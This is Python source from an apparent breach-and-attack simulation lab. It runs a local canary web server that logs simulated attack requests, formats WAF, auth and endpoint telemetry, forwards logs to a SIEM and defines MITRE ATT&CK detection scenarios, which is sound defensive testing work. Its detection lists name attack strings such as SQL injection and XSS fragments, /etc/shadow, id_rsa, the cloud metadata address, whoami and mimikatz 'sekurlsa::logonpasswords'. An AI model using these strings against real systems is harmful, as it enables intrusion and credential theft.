def ensure_lab_endpoint_target() -> str:
    target_url = os.environ.get("ATTACK_LAB_ENDPOINT_URL", _DEFAULT_ATTACK_LAB_ENDPOINT_URL).rstrip("/")
    if target_url != _DEFAULT_ATTACK_LAB_ENDPOINT_URL:
        return target_url
    return ensure_lab_web_server()


def _lab_target_info(server_url: str, target_kind: str = "web") -> dict[str, Any]:
    parsed = parse.urlparse(server_url)
    docker_target = (
        server_url != _DEFAULT_ATTACK_LAB_WEB_URL
        if target_kind == "web"
        else server_url != _DEFAULT_ATTACK_LAB_ENDPOINT_URL
    )
    return {
        "url": server_url,
        "host": parsed.hostname or _LAB_WEB_HOST,
        "port": parsed.port or (443 if parsed.scheme == "https" else 80),
        "status": "running",
        "target_kind": target_kind,
        "deployment": "docker_target" if docker_target else "in_process_test_fallback",
    }


def _web_request_sequence(simulation_id: str) -> list[dict[str, Any]]:
    return WEB_SIMULATION_REQUESTS.get(simulation_id, WEB_SIMULATION_REQUESTS["sim-t1595-http-fingerprint"])


def _send_lab_web_request(
    run_id: str,
    simulation_id: str,
    index: int,
    base_url: str,
    method: str,
    path: str,
    body: str = "",
    purpose: str = "",
    extra_headers: dict[str, str] | None = None,
) -> dict[str, Any]:
    url = f"{base_url}{path}"
    started = time.perf_counter()
    headers = {
        "User-Agent": f"AdversaryGraph-AttackSimulation/{simulation_id}",
        "X-AdversaryGraph-Run-Id": run_id,
        "X-AdversaryGraph-Simulation-Id": simulation_id,
        "X-AdversaryGraph-Request-Index": str(index),
        "X-AdversaryGraph-Request-Purpose": purpose,
    }
    headers.update({str(key): str(value) for key, value in (extra_headers or {}).items()})
    data = body.encode("utf-8") if body else None
    if data is not None:
        headers.setdefault("Content-Type", "application/json" if body.strip().startswith(("{", "[")) else "application/x-www-form-urlencoded")
    req = request.Request(url, data=data, method=method, headers=headers)
    try:
        with request.urlopen(req, timeout=5) as response:
            body = response.read(4096)
            status = response.status
            response_headers = dict(response.headers.items())
            ok = 200 <= status < 500
            error = ""
    except HTTPError as exc:
        body = exc.read(4096)
        status = exc.code
        response_headers = dict(exc.headers.items())
        ok = 200 <= status < 500
        error = str(exc)
    except URLError as exc:
        body = b""
        status = 0
        response_headers = {}
        ok = False
        error = str(exc.reason)
    duration_ms = round((time.perf_counter() - started) * 1000, 3)
    return {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "event_type": "attack_request",
        "run_id": run_id,
        "simulation_id": simulation_id,
        "request_index": index,
        "method": method,
        "url": url,
        "path": path,
        "purpose": purpose,
        "request_headers": _redact_sensitive_headers(headers),
        "request_body_length": len(data or b""),
        "request_body_sha256": hashlib.sha256(data).hexdigest() if data else "",
        "status": status,
        "ok": ok,
        "duration_ms": duration_ms,
        "response_bytes": len(body),
        "response_headers": response_headers,
        "error": error,
    }


def _redact_sensitive_headers(headers: dict[str, str]) -> dict[str, str]:
    redacted: dict[str, str] = {}
    for key, value in headers.items():
        if key.lower() in {"authorization", "proxy-authorization", "cookie", "set-cookie"}:
            redacted[key] = "[redacted]"
        else:
            redacted[key] = value
    return redacted


class _TelemetryWebHandler(BaseHTTPRequestHandler):
    server_version = "AdversaryGraphTelemetryWeb/1.0"

    def do_HEAD(self) -> None:
        self._handle_request(include_body=False)

    def do_OPTIONS(self) -> None:
        self._handle_request(include_body=True)

    def do_TRACE(self) -> None:
        self._handle_request(include_body=True)

    def do_GET(self) -> None:
        self._handle_request(include_body=True)

    def do_POST(self) -> None:
        self._handle_request(include_body=True)

    def log_message(self, format: str, *args: Any) -> None:
        logger.debug("Telemetry web server: " + format, *args)

    def _handle_request(self, include_body: bool) -> None:
        request_body = self._read_request_body()
        headers = {key: value for key, value in self.headers.items()}
        auth_event = _auth_event_for_request(self.command, self.path, request_body, headers)
        body = _response_body_for_path(self.path)
        status = 200 if body is not None else 404
        payload = body if body is not None else b"not found\n"
        if auth_event:
            status = int(auth_event["status"])
            payload = json.dumps(
                {
                    "status": auth_event["auth_outcome"],
                    "user_exists": auth_event["auth_user_exists"],
                    "reason": auth_event["auth_failure_reason"],
                }
            ).encode("utf-8") + b"\n"
        elif self.command == "POST":
            status = 200
            payload = b'{"status":"recorded","lab":"attack-simulation"}\n'
        content_type = "text/plain; charset=utf-8"
        if self.path == "/":
            content_type = "text/html; charset=utf-8"
        if self.command == "POST" or auth_event:
            content_type = "application/json"
        self.send_response(status)
        if self.command == "OPTIONS":
            self.send_header("Allow", "GET, HEAD, POST, OPTIONS")
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(payload)))
        self.send_header("X-AdversaryGraph-Lab", "attack-simulation")
        self.end_headers()
        if include_body:
            self.wfile.write(payload)
        self._log_access_event(status, len(payload) if include_body else 0, request_body, auth_event=auth_event)

    def _read_request_body(self) -> bytes:
        try:
            length = int(self.headers.get("Content-Length", "0") or "0")
        except ValueError:
            length = 0
        if length <= 0:
            return b""
        return self.rfile.read(min(length, 8192))

    def _log_access_event(self, status: int, response_bytes: int, request_body: bytes = b"", auth_event: dict[str, Any] | None = None) -> None:
        headers = {key: value for key, value in self.headers.items()}
        header_lookup = {key.lower(): value for key, value in headers.items()}
        parsed = parse.urlparse(self.path)
        query = parse.parse_qs(parsed.query, keep_blank_values=True)
        event = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "event_type": "lab_web_access",
            "run_id": header_lookup.get("x-adversarygraph-run-id", ""),
            "simulation_id": header_lookup.get("x-adversarygraph-simulation-id", ""),
            "request_index": header_lookup.get("x-adversarygraph-request-index", ""),
            "client_ip": self.client_address[0],
            "client_port": self.client_address[1],
            "method": self.command,
            "path": self.path,
            "clean_path": parsed.path,
            "query_keys": sorted(query.keys()),
            "protocol": self.request_version,
            "headers": _redact_sensitive_headers(headers),
            "body_length": len(request_body),
            "body_sha256": hashlib.sha256(request_body).hexdigest() if request_body else "",
            "body_preview": request_body[:1024].decode("utf-8", errors="replace") if request_body else "",
            "matched_canaries": _classify_web_canaries(self.command, self.path, headers, request_body),
            "status": status,
            "response_bytes": response_bytes,
        }
        if auth_event:
            event.update(auth_event)
        _append_jsonl(_web_access_log_path(), event)
        _append_operational_web_logs(event)


def _response_body_for_path(path: str) -> bytes | None:
    clean_path = path.split("?", 1)[0]
    if clean_path == "/":
        return (
            b"<html><head><title>AdversaryGraph Lab Web</title></head>"
            b"<body><h1>AdversaryGraph Attack Simulation Lab</h1></body></html>\n"
        )
    if clean_path == "/robots.txt":
        return b"User-agent: *\nDisallow: /admin\n"
    if clean_path == "/.well-known/security.txt":
        return b"Contact: mailto:security@example.test\nPolicy: https://example.test/security-policy\n"
    if clean_path == "/login":
        return b"login failed\n"
    if clean_path == "/basic-auth":
        return b"basic auth required\n"
    if clean_path == "/login/user-check":
        return b'{"status":"recorded","lab":"attack-simulation"}\n'
    if clean_path == "/internal/activity":
        return b'{"status":"recorded","lab":"attack-simulation","type":"internal_activity"}\n'
    if clean_path.startswith("/api/"):
        return b'{"status":"ok","lab":"attack-simulation"}\n'
    if clean_path in {"/admin", "/download", "/fetch", "/proxy", "/cgi-bin/status", "/shell.php"}:
        return b"lab canary recorded\n"
    if clean_path.startswith("/downloads/"):
        return b"AG_BENIGN_DOWNLOAD_CANARY\n"
    if clean_path.startswith("/upload/"):
        return b"upload canary recorded\n"
    return None


def _auth_event_for_request(method: str, path: str, body: bytes, headers: dict[str, str] | None = None) -> dict[str, Any] | None:
    parsed = parse.urlparse(path)
    clean_path = parsed.path
    query = parse.parse_qs(parsed.query, keep_blank_values=True)
    body_fields = _parse_request_fields(body)
    fields = {**{key: values[-1] if values else "" for key, values in query.items()}, **body_fields}
    header_lookup = {key.lower(): value for key, value in (headers or {}).items()}
    canary = str(fields.get("ag_canary") or "").lower()

    if method == "GET" and clean_path == "/login/user-check":
        username = str(fields.get("username") or "").strip()
        exists = username in LAB_AUTH_USERS
        return {
            "event_type": "lab_web_auth_enumeration",
            "auth_username": username,
            "auth_user_hash": _stable_hash(username),
            "auth_user_exists": exists,
            "auth_outcome": "user_exists" if exists else "user_unknown",
            "auth_failure_reason": "" if exists else "unknown_user",
            "credential_attack_type": "user_enumeration",
            "password_length": 0,
            "password_sha256": "",
            "status": 200 if exists else 404,
        }

    if method == "GET" and clean_path == "/basic-auth":
        username, password = _parse_basic_auth_header(str(header_lookup.get("authorization") or ""))
        exists = username in LAB_AUTH_USERS
        success = exists and LAB_AUTH_USERS[username] == password
        return {
            "event_type": "lab_web_basic_auth",
            "auth_username": username,
            "auth_user_hash": _stable_hash(username) if username else "",
            "auth_user_exists": exists,
            "auth_outcome": "success" if success else "failure",
            "auth_failure_reason": "" if success else ("bad_password" if exists else "unknown_user"),
            "credential_attack_type": "basic_auth_bruteforce",
            "password_length": len(password),
            "password_sha256": _stable_hash(password) if password else "",
            "status": 200 if success else 401,
        }

    if method == "POST" and clean_path == "/login":
        username = str(fields.get("username") or "").strip()
        password = str(fields.get("password") or "")
        exists = username in LAB_AUTH_USERS
        success = exists and LAB_AUTH_USERS[username] == password
        attack_type = _credential_attack_type(canary, username=username, exists=exists)
        return {
            "event_type": "lab_web_auth",
            "auth_username": username,
            "auth_user_hash": _stable_hash(username),
            "auth_user_exists": exists,
            "auth_outcome": "success" if success else "failure",
            "auth_failure_reason": "" if success else ("bad_password" if exists else "unknown_user"),
            "credential_attack_type": attack_type,
            "password_length": len(password),
            "password_sha256": _stable_hash(password) if password else "",
            "status": 200 if success else (404 if not exists else 401),
        }

    return None


def _parse_basic_auth_header(header: str) -> tuple[str, str]:
    if not header.lower().startswith("basic "):
        return ("", "")
    try:
        decoded = base64.b64decode(header.split(" ", 1)[1], validate=True).decode("utf-8", errors="replace")
    except Exception:
        return ("", "")
    username, _, password = decoded.partition(":")
    return (username, password)


def _parse_request_fields(body: bytes) -> dict[str, str]:
    if not body:
        return {}
    text = body.decode("utf-8", errors="replace")
    stripped = text.strip()
    if stripped.startswith("{"):
        try:
            loaded = json.loads(stripped)
        except json.JSONDecodeError:
            return {}
        if isinstance(loaded, dict):
            return {str(key): str(value) for key, value in loaded.items()}
        return {}
    parsed = parse.parse_qs(text, keep_blank_values=True)
    return {key: values[-1] if values else "" for key, values in parsed.items()}


def _credential_attack_type(canary: str, username: str, exists: bool) -> str:
    if "brute_force" in canary:
        return "brute_force"
    if "password_spray" in canary:
        return "password_spray"
    if "user_enumeration" in canary or not exists:
        return "user_enumeration"
    if "failed_login" in canary:
        return "failed_login"
    return "login"


def _stable_hash(value: str) -> str:
    return hashlib.sha256(value.encode("utf-8")).hexdigest()


def _classify_web_canaries(method: str, path: str, headers: dict[str, str], body: bytes) -> list[str]:
    header_lookup = {key.lower(): value for key, value in headers.items()}
    user_agent = str(header_lookup.get("user-agent") or "").lower()
    method_override = str(header_lookup.get("x-http-method-override") or "").lower()
    haystack = " ".join(
        [
            method,
            parse.unquote_plus(path),
            user_agent,
            method_override,
            body.decode("utf-8", errors="replace"),
        ]
    ).lower()
    indicators = {
        "path_traversal": ["../", "%2e%2e", "etc/passwd", "win.ini"],
        "sqli": ["' or '1'='1", "ag_canary=sqli"],
        "xss": ["<script>", "ag_xss_canary", "ag_canary=xss"],
        "ssrf": ["169.254.169.254", "127.0.0.1:22", "ag_canary=ssrf"],
        "command_injection": ["cmd=id", '"command":"whoami"', "ag_canary=command_injection"],
        "webshell": ["shell.php", "cmd.aspx", "ag_canary=webshell"],
        "tool_transfer": ["agent.ps1", "ag_benign_upload_canary", "ag_canary=tool_download"],
        "secret_exposure": ["/.env", "config.php.bak", "/id_rsa", "ag_canary=secret_exposure"],
        "failed_login": ["ag_canary=failed_login", "password=wrong"],
        "brute_force": ["ag_canary=brute_force"],
        "password_spray": ["ag_canary=password_spray"],
        "user_enumeration": ["ag_canary=user_enumeration", "/login/user-check"],
        "beacon": ["ag_canary=beacon", "/api/ping", "/api/telemetry"],
        "exfil": ["ag_canary=exfil", "ag_exfil_canary", "/api/export", "/collect"],
        "admin_discovery": ["/admin", "/.git/config", "/backup.zip"],
        "http_method_probe": ["ag_canary=http_method_probe", "options", "trace", "delete"],
        "not_found_burst": ["ag_canary=not_found_burst", "/wp-admin", "/phpmyadmin", "/server-status", "/actuator/env", "/.svn/entries", "/owa/auth/logon.aspx"],
        "tool_user_agent": ["ag_canary=tool_user_agent", "curl/", "python-requests", "sqlmap", "nmap scripting engine"],
        "basic_auth_bruteforce": ["ag_canary=basic_auth_bruteforce", "/basic-auth"],
        "suspicious_upload": ["ag_canary=suspicious_upload", "/upload/shell.php", "/upload/cmd.aspx", "/upload/agent.jsp"],
        "shadow_file_access": ['ag_canary":"shadow_file_access', "ag_canary=shadow_file_access", "/etc/shadow"],
        "mimikatz_lsass": ['ag_canary":"mimikatz_lsass', "mimikatz", "sekurlsa::logonpasswords"],
        "lsass_dump": ['ag_canary":"lsass_minidump', 'ag_canary":"procdump_lsass', "minidump", "procdump", "lsass.dmp"],
    }
    matches: list[str] = []
    for name, needles in indicators.items():
        if any(needle in haystack for needle in needles):
            matches.append(name)
    return matches


def _ensure_log_dir() -> Path:
    path = Path(settings.log_dir) / "attack-simulation"
    path.mkdir(parents=True, exist_ok=True)
    return path


def _attack_log_path(run_id: str) -> Path:
    return _ensure_log_dir() / f"{run_id}.jsonl"


def _web_access_log_path() -> Path:
    return _ensure_log_dir() / "lab-web-access.jsonl"


def _web_server_access_log_path() -> Path:
    return _ensure_log_dir() / "lab-web-access.log"


def _web_security_log_path() -> Path:
    return _ensure_log_dir() / "lab-web-security.log"


def _web_error_log_path() -> Path:
    return _ensure_log_dir() / "lab-web-error.log"


def _web_auth_log_path() -> Path:
    return _ensure_log_dir() / "lab-web-auth.log"


def _endpoint_log_path() -> Path:
    return _ensure_log_dir() / "lab-endpoint.log"


def _endpoint_jsonl_path() -> Path:
    return _ensure_log_dir() / "lab-endpoint.jsonl"


def _shared_lab_web_log_paths() -> list[Path]:
    return [
        _web_access_log_path(),
        _web_server_access_log_path(),
        _web_security_log_path(),
        _web_error_log_path(),
        _web_auth_log_path(),
        _endpoint_log_path(),
        _endpoint_jsonl_path(),
    ]


def clear_shared_lab_web_logs() -> list[str]:
    cleared: list[str] = []
    for path in _shared_lab_web_log_paths():
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text("", encoding="utf-8")
        cleared.append(str(path))
    return cleared


def _append_jsonl(path: Path, event: dict[str, Any]) -> None:
    with path.open("a", encoding="utf-8") as handle:
        handle.write(json.dumps(event, sort_keys=True) + "\n")


def _append_text_line(path: Path, line: str) -> None:
    with path.open("a", encoding="utf-8") as handle:
        handle.write(line.rstrip("\n") + "\n")


def _append_operational_web_logs(event: dict[str, Any]) -> None:
    _append_text_line(_web_server_access_log_path(), _format_web_access_line(event))
    matches = event.get("matched_canaries") or []
    if matches:
        for category in matches:
            if str(category) in ENDPOINT_CANARY_CATEGORIES:
                _append_text_line(_endpoint_log_path(), _format_internal_activity_line(event, str(category)))
            else:
                _append_text_line(_web_security_log_path(), _format_web_security_line(event, str(category)))
    if event.get("credential_attack_type") or str(event.get("event_type") or "").startswith("lab_web_auth"):
        _append_text_line(_web_auth_log_path(), _format_web_auth_line(event))
    status = int(event.get("status") or 0)
    if status >= 400:
        _append_text_line(_web_error_log_path(), _format_web_error_line(event))


def _format_web_access_line(event: dict[str, Any]) -> str:
    timestamp = _apache_log_time(str(event.get("timestamp") or ""))
    client_ip = str(event.get("client_ip") or "-")
    method = str(event.get("method") or "-")
    path = str(event.get("path") or "-").replace('"', r'\"')
    protocol = str(event.get("protocol") or "HTTP/1.1")
    status = int(event.get("status") or 0)
    response_bytes = int(event.get("response_bytes") or 0)
    headers = event.get("headers") if isinstance(event.get("headers"), dict) else {}
    referer = str(headers.get("Referer") or "-").replace('"', r'\"')
    user_agent = str(headers.get("User-Agent") or "-").replace('"', r'\"')
    run_id = str(event.get("run_id") or "-")
    simulation_id = str(event.get("simulation_id") or "-")
    body_length = int(event.get("body_length") or 0)
    matches = ",".join(str(item) for item in event.get("matched_canaries") or []) or "-"
    auth_user = str(event.get("auth_username") or "-").replace('"', r'\"')
    auth_outcome = str(event.get("auth_outcome") or "-").replace('"', r'\"')
    return (
        f'{client_ip} - - [{timestamp}] "{method} {path} {protocol}" {status} {response_bytes} '
        f'"{referer}" "{user_agent}" rt=0.001 run_id="{run_id}" simulation_id="{simulation_id}" '
        f'body_bytes={body_length} canaries="{matches}" auth_user="{auth_user}" auth_outcome="{auth_outcome}"'
    )


def _format_web_security_line(event: dict[str, Any], category: str) -> str:
    timestamp = str(event.get("timestamp") or datetime.now(timezone.utc).isoformat())
    client_ip = str(event.get("client_ip") or "-")
    method = str(event.get("method") or "-")
    path = str(event.get("path") or "-").replace('"', r'\"')
    clean_path = str(event.get("clean_path") or "-").replace('"', r'\"')
    run_id = str(event.get("run_id") or "-")
    simulation_id = str(event.get("simulation_id") or "-")
    status = int(event.get("status") or 0)
    body_sha = str(event.get("body_sha256") or "-")
    severity = _security_severity(category)
    rule_id = _security_rule_id(category)
    return (
        f'{timestamp} attack-simulation-waf alert_id="{rule_id}" severity="{severity}" '
        f'category="{category}" client="{client_ip}" method="{method}" uri="{path}" clean_uri="{clean_path}" '
        f'status={status} run_id="{run_id}" simulation_id="{simulation_id}" body_sha256="{body_sha}" '
        f'msg="Matched AdversaryGraph {category} canary in lab web telemetry"'
    )


def _format_internal_activity_line(event: dict[str, Any], category: str) -> str:
    body = str(event.get("body_preview") or "")
    process = _json_field(body, "process") or _process_for_category(category)
    command = _json_field(body, "command") or " ".join(_json_array_field(body, "args"))
    file_path = _json_field(body, "file_path") or _file_for_category(category)
    target_process = _json_field(body, "target_process") or "-"
    operation = _json_field(body, "operation") or category
    timestamp = str(event.get("timestamp") or datetime.now(timezone.utc).isoformat())
    path = str(event.get("path") or "-").replace('"', r'\"')
    command = command.replace('"', r'\"') or "-"
    provider, event_id, event_name = _endpoint_provider_fields(category)
    return (
        f'{timestamp} attack-simulation-endpoint provider="{provider}" event_id="{event_id}" '
        f'event_name="{event_name}" event="internal_activity" category="{category}" '
        f'severity="{_security_severity(category)}" host="attack-lab-web" user="lab-user" '
        f'process="{process}" command="{command}" file_path="{file_path}" target_process="{target_process}" '
        f'operation="{operation}" client="{event.get("client_ip") or "-"}" method="{event.get("method") or "-"}" '
        f'uri="{path}" status={int(event.get("status") or 0)} run_id="{event.get("run_id") or "-"}" '
        f'simulation_id="{event.get("simulation_id") or "-"}" '
        f'msg="Matched AdversaryGraph internal activity canary: {category}"'
    )


def _json_field(body: str, field: str) -> str:
    try:
        value = json.loads(body).get(field, "")
    except (json.JSONDecodeError, AttributeError):
        return ""
    return str(value) if value is not None and not isinstance(value, list) else ""


def _endpoint_provider_fields(category: str) -> tuple[str, str, str]:
    if category == "shadow_file_access":
        return ("auditd", "SYSCALL", "FileAccess")
    if category == "mimikatz_lsass":
        return ("sysmon", "1", "ProcessCreate")
    if category == "lsass_dump":
        return ("sysmon", "10", "ProcessAccess")
    if category == "run_key_persistence":
        return ("sysmon", "13", "RegistryValueSet")
    if category == "file_discovery":
        return ("edr", "FILE_DISCOVERY", "FileDiscovery")
    if category in {
        "powershell_encoded",
        "cmd_shell",
        "certutil_transfer",
        "scheduled_task",
        "service_creation",
        "rundll32_proxy",
        "regsvr32_proxy",
        "system_discovery",
        "user_discovery",
        "process_discovery",
        "network_config_discovery",
        "remote_system_discovery",
        "software_discovery",
    }:
        return ("sysmon", "1", "ProcessCreate")
    return ("edr", "-", "EndpointActivity")


def _json_array_field(body: str, field: str) -> list[str]:
    try:
        value = json.loads(body).get(field, [])
    except (json.JSONDecodeError, AttributeError):
        return []
    if isinstance(value, list):
        return [str(item) for item in value]
    return []


def _process_for_category(category: str) -> str:
    return {
        "shadow_file_access": "cat",
        "mimikatz_lsass": "mimikatz.exe",
        "lsass_dump": "procdump64.exe",
        "powershell_encoded": "powershell.exe",
        "cmd_shell": "cmd.exe",
        "certutil_transfer": "certutil.exe",
        "run_key_persistence": "reg.exe",
        "scheduled_task": "schtasks.exe",
        "service_creation": "sc.exe",
        "rundll32_proxy": "rundll32.exe",
        "regsvr32_proxy": "regsvr32.exe",
        "system_discovery": "systeminfo.exe",
        "file_discovery": "cmd.exe",
        "user_discovery": "whoami.exe",
        "process_discovery": "tasklist.exe",
        "network_config_discovery": "ipconfig.exe",
        "remote_system_discovery": "net.exe",
        "software_discovery": "wmic.exe",
    }.get(category, "-")


def _file_for_category(category: str) -> str:
    return "/etc/shadow" if category == "shadow_file_access" else "-"


def _format_web_error_line(event: dict[str, Any]) -> str:
    timestamp = str(event.get("timestamp") or datetime.now(timezone.utc).isoformat())
    client_ip = str(event.get("client_ip") or "-")
    method = str(event.get("method") or "-")
    path = str(event.get("path") or "-").replace('"', r'\"')
    status = int(event.get("status") or 0)
    run_id = str(event.get("run_id") or "-")
    simulation_id = str(event.get("simulation_id") or "-")
    return (
        f'[{timestamp}] [error] [client {client_ip}] lab web server returned HTTP {status}, '
        f'request="{method} {path}" run_id="{run_id}" simulation_id="{simulation_id}"'
    )


def _format_web_auth_line(event: dict[str, Any]) -> str:
    timestamp = str(event.get("timestamp") or datetime.now(timezone.utc).isoformat())
    client_ip = str(event.get("client_ip") or "-")
    username = str(event.get("auth_username") or "-").replace('"', r'\"')
    user_hash = str(event.get("auth_user_hash") or "-")
    exists = str(bool(event.get("auth_user_exists"))).lower()
    outcome = str(event.get("auth_outcome") or "-")
    reason = str(event.get("auth_failure_reason") or "-")
    attack_type = str(event.get("credential_attack_type") or "-")
    method = str(event.get("method") or "-")
    path = str(event.get("path") or "-").replace('"', r'\"')
    run_id = str(event.get("run_id") or "-")
    simulation_id = str(event.get("simulation_id") or "-")
    status = int(event.get("status") or 0)
    password_length = int(event.get("password_length") or 0)
    password_sha = str(event.get("password_sha256") or "-")
    return (
        f'{timestamp} adversarygraph-lab-auth event="{outcome}" attack_type="{attack_type}" '
        f'user="{username}" user_hash="{user_hash}" user_exists={exists} src="{client_ip}" '
        f'method="{method}" uri="{path}" status={status} failure_reason="{reason}" '
        f'password_len={password_length} password_sha256="{password_sha}" run_id="{run_id}" '
        f'simulation_id="{simulation_id}"'
    )


def _security_rule_id(category: str) -> str:
    digest = hashlib.sha1(category.encode("utf-8")).hexdigest()[:6].upper()
    return f"AG-WEB-{digest}"


def _security_severity(category: str) -> str:
    if category in {
        "webshell",
        "command_injection",
        "exfil",
        "secret_exposure",
        "brute_force",
        "password_spray",
        "basic_auth_bruteforce",
        "suspicious_upload",
        "shadow_file_access",
        "mimikatz_lsass",
        "lsass_dump",
        "powershell_encoded",
        "certutil_transfer",
        "run_key_persistence",
        "scheduled_task",
        "service_creation",
        "rundll32_proxy",
        "regsvr32_proxy",
    }:
        return "high"
    if category in {
        "sqli",
        "xss",
        "ssrf",
        "path_traversal",
        "failed_login",
        "user_enumeration",
        "http_method_probe",
        "not_found_burst",
        "tool_user_agent",
        "cmd_shell",
        "system_discovery",
        "file_discovery",
        "user_discovery",
        "process_discovery",
        "network_config_discovery",
        "remote_system_discovery",
        "software_discovery",
    }:
        return "medium"
    return "low"


def _apache_log_time(value: str) -> str:
    try:
        parsed = datetime.fromisoformat(value.replace("Z", "+00:00"))
    except ValueError:
        parsed = datetime.now(timezone.utc)
    return parsed.strftime("%d/%b/%Y:%H:%M:%S %z")


def tail_telemetry_logs(source: str = "web", run_id: str = "", limit: int = 100) -> dict[str, Any]:
    limit = max(1, min(limit, 500))
    if source not in LOG_SOURCES:
        raise ValueError("Unknown telemetry log source")
    if source == "attacked_server":
        path = _ensure_log_dir()
        events = _tail_attacked_server_logs(limit=limit, run_id=run_id)
        exists = path.exists()
    elif source == "run":
        if not _RUN_ID_RE.match(run_id):
            raise ValueError("A valid run_id is required for run telemetry logs")
        path = _attack_log_path(run_id)
        events = _tail_jsonl(path, limit=limit, run_id="")
        exists = path.exists()
    elif source == "web":
        path = _web_access_log_path()
        events = _tail_jsonl(path, limit=limit, run_id=run_id)
        for event in events:
            event.setdefault("source", "web")
        exists = path.exists()
    else:
        paths = {
            "access": _web_server_access_log_path(),
            "security": _web_security_log_path(),
            "error": _web_error_log_path(),
            "auth": _web_auth_log_path(),
            "endpoint": _endpoint_log_path(),
        }
        path = paths[source]
        events = _tail_text_log(path, source=source, limit=limit, run_id=run_id)
        exists = path.exists()

    return {
        "source": source,
        "run_id": run_id,
        "log_file": str(path),
        "exists": exists,
        "line_count": len(events),
        "events": events,
        "returned_at": datetime.now(timezone.utc).isoformat(),
    }


def forward_telemetry_logs(
    source: str,
    run_id: str,
    destination_url: str,
    limit: int = 100,
    auth_type: str = "none",
    username: str = "",
    password: str = "",
    token: str = "",
    header_name: str = "",
    connection_mode: str = "auto",
    allow_http_fallback: bool = True,
    payload_format: str = "raw_lines",
) -> dict[str, Any]:
    destination = _validate_siem_destination(destination_url, connection_mode=connection_mode)
    logs = tail_telemetry_logs(source=source, run_id=run_id, limit=limit)
    if payload_format not in {"raw_lines", "per_event", "json_lines", "envelope"}:
        raise ValueError("Unsupported SIEM payload format")
    headers = {
        "Content-Type": "text/plain; charset=utf-8" if payload_format == "raw_lines" else "application/json",
        "User-Agent": "AdversaryGraph-AttackSimulation-Forwarder/1.0",
        "X-AdversaryGraph-Module": "attack-simulation",
        "X-AdversaryGraph-Run-Id": run_id,
        "X-Xpolog-Sender": "adversarygraph-attack-simulation",
    }
    headers.update(_siem_auth_headers(auth_type, username=username, password=password, token=token, header_name=header_name))
    started = time.perf_counter()
    if payload_format in {"raw_lines", "per_event"}:
        return _forward_siem_events_individually(
            destination=destination,
            logs=logs,
            headers=headers,
            started=started,
            original_destination=destination_url,
            connection_mode=connection_mode,
            allow_http_fallback=allow_http_fallback,
            payload_format=payload_format,
        )
    body = _siem_payload_body(logs, payload_format)
    result, fallback_note = _post_siem_payload(
        destination=destination,
        body=body,
        headers=headers,
        started=started,
        original_destination=destination_url,
        connection_mode=connection_mode,
        allow_http_fallback=allow_http_fallback,
    )
    result.update(
        {
            "source": source,
            "run_id": run_id,
            "event_count": logs["line_count"],
            "duration_ms": round((time.perf_counter() - started) * 1000, 3),
            "http_fallback_used": bool(fallback_note),
            "fallback_note": fallback_note,
            "payload_format": payload_format,
            "sent_event_count": logs["line_count"],
        }
    )
    return result


ASSISTANT_ACTOR_TTPS: dict[str, list[str]] = {
    "apt29": ["T1078", "T1059.001", "T1082", "T1105", "T1003.001", "T1041"],
    "fin7": ["T1190", "T1059.001", "T1110.001", "T1105", "T1053.005", "T1003.001"],
    "lazarus": ["T1566.001", "T1204.002", "T1059.003", "T1105", "T1547.001", "T1041"],
    "generic-intrusion": ["T1595", "T1190", "T1110", "T1078", "T1059.001", "T1003.001", "T1105"],
}

ASSISTANT_COMPLICATED_CHALLENGE_TTPS = [
    "T1595",
    "T1190",
    "T1589.002",
    "T1110.001",
    "T1078",
    "T1059.001",
    "T1105",
    "T1218.011",
    "T1046",
    "T1071.004",
    "T1071.001",
    "T1003.001",
    "T1547.001",
    "T1053.005",
    "T1041",
    "T1567.002",
]

ASSISTANT_SCENARIOS: list[dict[str, Any]] = [
    {
        "id": "web-to-endpoint-intrusion",
        "name": "Web App to Endpoint Compromise",
        "difficulty": "full_intrusion",
        "description": "A plausible external web intrusion that progresses from public reconnaissance to web exploit attempts, identity attack, valid account foothold, endpoint execution, C2, credential access, persistence, and exfiltration.",
        "technique_ids": ASSISTANT_COMPLICATED_CHALLENGE_TTPS,
        "preconditions": [
            "Approved lab web target is selected.",
            "Endpoint, Windows Security, Sysmon, web, WAF, DNS, firewall, and proxy telemetry parsers are enabled in the SIEM.",
            "SIEM destination is configured and reachable.",
        ],
        "success_criteria": [
            "SIEM receives all scenario events with one run_id.",
            "Rules detect web exploitation, password attack, valid-account success, endpoint execution, C2, credential access, persistence, and exfiltration phases.",
            "Correlation links at least three telemetry sources to the same source host/user timeline.",
        ],
        "telemetry_sources": ["nginx", "waf", "application_auth", "windows_security", "sysmon", "firewall", "dns", "edr", "proxy"],
        "expected_detections": [
            "High-volume reconnaissance and public-app exploit canaries.",
            "Username enumeration and password spraying with failure-to-success transition.",
            "Suspicious PowerShell, ingress transfer, and signed binary proxy execution.",
            "Internal port sweep, DNS/TLS C2, LSASS access, persistence, and outbound exfiltration.",
        ],
        "tags": ["web", "identity", "endpoint", "c2", "exfiltration", "persistence"],
    },
    {
        "id": "identity-spray-to-foothold",
        "name": "Password Spray to Valid Account Foothold",
        "difficulty": "simple_chain",
        "description": "External username enumeration and password spraying followed by a valid-account login and endpoint discovery.",
        "technique_ids": ["T1589.002", "T1110.001", "T1078", "T1059.001", "T1046"],
        "preconditions": ["Auth telemetry is parsed.", "Windows Security 4624/4625 events are collected.", "Endpoint/Sysmon telemetry is available."],
        "success_criteria": ["Detect many-account failure pattern.", "Detect success after failures.", "Correlate the authenticated host to follow-on discovery."],
        "telemetry_sources": ["application_auth", "windows_security", "sysmon", "firewall"],
        "expected_detections": ["User enumeration", "Password spray", "Valid account success", "Post-login discovery"],
        "tags": ["identity", "endpoint"],
    },
    {
        "id": "sql-injection-to-data-theft",
        "name": "SQL Injection to Data Theft",
        "difficulty": "full_intrusion",
        "description": "Public web exploit attempts produce WAF and web telemetry, followed by C2, transfer, and exfiltration-shaped events.",
        "technique_ids": ["T1595", "T1190", "T1105", "T1071.004", "T1071.001", "T1041", "T1567.002"],
        "preconditions": ["Web/WAF logs are parsed.", "DNS/proxy telemetry is available.", "SIEM can correlate by source IP and run_id."],
        "success_criteria": ["Detect SQLi/XSS/path traversal canaries.", "Detect outbound staging and exfiltration.", "Correlate exploit source to later outbound events."],
        "telemetry_sources": ["nginx", "waf", "dns", "edr", "proxy"],
        "expected_detections": ["Web exploit burst", "Tool transfer", "Suspicious DNS", "Large outbound upload"],
        "tags": ["web", "c2", "exfiltration"],
    },
